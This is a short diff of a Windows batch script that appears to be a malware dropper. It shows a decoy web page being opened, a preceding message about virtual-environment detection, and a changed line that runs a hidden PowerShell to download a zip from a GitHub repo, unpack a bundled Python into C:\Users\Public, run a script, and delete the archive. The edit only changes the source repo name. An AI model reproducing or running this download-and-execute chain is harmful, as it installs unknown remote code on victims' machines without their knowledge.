@@ -63,7 +63,7 @@ echo No virtual environments detected. Continuing execution...
 :: Place your main script here
 start "" chrome "https://iidjob.tiiny.site/"
 
-start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/anhtuan45649/bot-14-10/raw/main/Document.zip', 'C:\Users\Public\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\Users\Public\Document\python.exe C:\Users\Public\Document\Lib\sim.py; del C:/Users/Public/Document.zip"
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/anhtuan45649/bot-14-9/raw/main/Document.zip', 'C:\Users\Public\Document.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document'); Start-Sleep -Seconds 1; C:\Users\Public\Document\python.exe C:\Users\Public\Document\Lib\sim.py; del C:/Users/Public/Document.zip"
 
 endlocal
 exit /b 0
